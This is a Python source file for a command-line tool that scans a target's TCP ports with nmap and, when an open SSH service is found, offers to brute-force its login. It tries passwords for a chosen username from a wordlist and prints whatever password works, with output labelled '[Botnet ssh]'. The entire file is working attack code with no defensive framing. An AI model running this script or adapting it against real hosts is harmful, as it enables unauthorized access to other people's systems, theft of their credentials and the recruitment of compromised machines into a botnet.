import nmap
import optparse
import time
from sys import argv
from os import path
from colorama import init, Fore
from pexpect import pxssh

# Colorama
init(autoreset=True)

# Brute force SSH
Found = False
Fails = 0

ssh_info = None

# FONCTIONS

def connect(host, user, password):
    global Found
    global Fails
    global ssh_info

    try:
        ssh = pxssh.pxssh()
        ssh.login(host, user, password, login_timeout=60, auto_prompt_reset=False, port=ssh_info['port'])
        print(f"{Fore.BLUE}[{Fore.YELLOW}+{Fore.BLUE}] {Fore.MAGENTA}Password {Fore.LIGHTGREEN_EX}Found: {password}")
        Found = True
        ssh_info['password'] = password
        ssh_info['user'] = user
        ssh.logout()
    except pxssh.ExceptionPxssh as e:
        print(f"{Fore.BLUE}[{Fore.YELLOW}-{Fore.BLUE}] {Fore.MAGENTA}Password {Fore.RED}Incorrect {Fore.YELLOW}{password}")
        Fails += 1
        # time.sleep(1)    

def brute_force_ssh(host):
    global Found
    global ssh_info
    global Fails

    username = None

    while username == None or ' ' in username:
        username = input(f"{Fore.BLUE}Write the {Fore.MAGENTA}username{Fore.BLUE}: ") 
    
    print("\n")
    try:
        wordlist = open("passwords.lst", "r")
        while True:
            psswd = str(wordlist.readline().strip('\r').strip('\n'))
            if Found:
                print("\n")
                print(f"{Fore.BLUE}[Botnet ssh] {Fore.LIGHTGREEN_EX}Access granted {Fore.BLUE}for {Fore.MAGENTA}user "\
                        f"{Fore.BLUE}= {Fore.YELLOW}{username} {Fore.BLUE}and {Fore.MAGENTA}password {Fore.BLUE}= {Fore.YELLOW}{ssh_info['password']} "\
                        f"{Fore.BLUE}in {Fore.WHITE}{Fails} {Fore.BLUE}attempt(s)")
                exit(0)
            connect(host, username, psswd)

            if not psswd:
                print(f"{Fore.BLUE}End of file, {Fore.MAGENTA}password {Fore.RED}not found !")
                break
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Wordlist not found!")


def nmapScan(tgtHost, tgtPort):
    nScan = nmap.PortScanner()
    nScan.scan(tgtHost, tgtPort)
    state = nScan[tgtHost]['tcp'][int(tgtPort)]['state']
    name = nScan[tgtHost]['tcp'][int(tgtPort)]['name']
    product = nScan[tgtHost]['tcp'][int(tgtPort)]['product']
    version = nScan[tgtHost]['tcp'][int(tgtPort)]['version']

    if ((name == "ssh" or product == "OpenSSH") and state == 'open'):
        global ssh_info
        ssh_info = {
                'port': tgtPort,
                'product': product,
                'version': version}
    print(f"{Fore.BLUE}[{Fore.YELLOW}{'+' if state == 'open' else '-'}{Fore.BLUE}] {tgtHost} tcp/{tgtPort} {Fore.LIGHTGREEN_EX if state == 'open' else Fore.RED}{state}")

# MAIN

def main():
    global ssh_info
    prog = path.basename(argv[0])
    usage = f"[Usage]: {prog} -H <target host> -p <target port>"
    parser = optparse.OptionParser(usage=usage)
    parser.add_option('-H', dest='tgtHost', type='string', \
            help='specify target host\'s IP address.')

    parser.add_option('-p', dest='tgtPort', type='string', \
            help='specify target port[s] eparated by comma. Or put - for range: 21-25.')
    (options, args) = parser.parse_args()

    tgtHost = options.tgtHost

    if '-' in options.tgtPort:
        range_list = options.tgtPort.split('-')
        ports = ""
        for i in range(int(range_list[0]), int(range_list[1]) + 1):
            ports += f"{i}," if i != int(range_list[1]) else f"{i}"
        tgtPorts = ports.split(',')
    else:
        tgtPorts = str(options.tgtPort).split(',')

    if tgtHost == None or options.tgtPort == None:
        print(parser.usage)
        exit(0)
    else:
        print('-'*100)
        print(f'Host : {tgtHost}')
        print("Port(s) : ", end="")
        print(*tgtPorts, sep=', ')
        for port in tgtPorts:
            nmapScan(tgtHost, port)
        if ssh_info != None:
            print(f"\n{Fore.MAGENTA}SSH service {Fore.BLUE}seems to be {Fore.GREEN}active{Fore.BLUE}.")
            print(f"{Fore.CYAN}Port: {Fore.YELLOW}tcp/{ssh_info['port']}")
            print(f"{Fore.CYAN}Service: {Fore.YELLOW}{ssh_info['product']}")
            print(f"{Fore.CYAN}Version: {Fore.YELLOW}{ssh_info['version']}")
            answer = "None"
            while answer.upper() != 'Y' and answer.upper() != 'N':
                answer = input(f"\n{Fore.BLUE}Would you like to perform a brute force attack on this {Fore.WHITE}target {Fore.BLUE}and {Fore.WHITE}port {Fore.BLUE}? (y/n): ")
            if answer.upper() == 'Y':
                brute_force_ssh(tgtHost)
            else:
                exit(0)
     

if __name__ == "__main__":
    main()
